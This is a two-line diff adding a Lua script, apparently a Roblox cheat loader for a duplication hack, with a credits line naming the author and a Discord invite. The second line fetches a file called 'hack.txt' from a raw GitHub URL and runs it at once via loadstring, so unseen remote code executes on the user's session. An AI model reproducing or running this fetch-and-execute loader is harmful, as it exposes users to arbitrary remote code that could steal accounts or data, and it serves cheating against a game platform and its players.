@@ -1,0 +1,2 @@
+_G.credits = [[Made By: The_KillerHood#8154,Server Link:  https://discord.gg/bWbumb8dKj, If You Have Paid For This You Got Scammed Loser.]]
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/HelipopHacker/Dupe/main/hack.txt"), true))()
